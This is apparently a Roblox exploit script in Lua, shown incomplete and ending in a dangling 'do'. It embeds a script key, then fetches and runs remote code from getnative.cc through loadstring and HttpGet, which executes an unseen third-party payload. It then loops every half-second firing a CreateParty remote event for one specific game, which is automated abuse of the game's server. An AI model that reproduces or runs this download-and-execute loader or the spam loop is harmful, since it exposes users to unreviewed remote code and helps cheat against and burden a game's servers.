local placeId = game.PlaceId

local args = {
	{
		trainId = "default",
		maxMembers = 1,
		gameMode = "Normal"
	}
}

script_key="qXYdOmXCQPyzBzgTYjIqsVrXuvhvwUAm";

(loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()

if placeId == 116495829188952 then
    while wait(0.5) do
        game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Network"):WaitForChild("RemoteEvent"):WaitForChild("CreateParty"):FireServer(unpack(args))
    end
    
do
